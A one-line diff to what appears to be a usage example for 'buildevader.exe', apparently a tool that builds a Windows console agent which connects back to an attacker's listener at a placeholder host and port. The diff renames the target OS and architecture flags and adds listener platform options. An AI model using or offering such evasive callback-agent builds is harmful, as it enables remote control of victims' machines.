@@ -1,1 +1,1 @@
-buildevader.exe --rhost "RHOST" --rport 6789 --bintype "console" --targetos "windows" --targetarch "386" --saveas "urchoice"
+buildevader.exe --rhost "ListenerIP" --rport listenerport --bintype "console" --agentos "windows" --agentarch "386" --listeneros "linux" --listenerarch "amd64" --saveas "linwin"
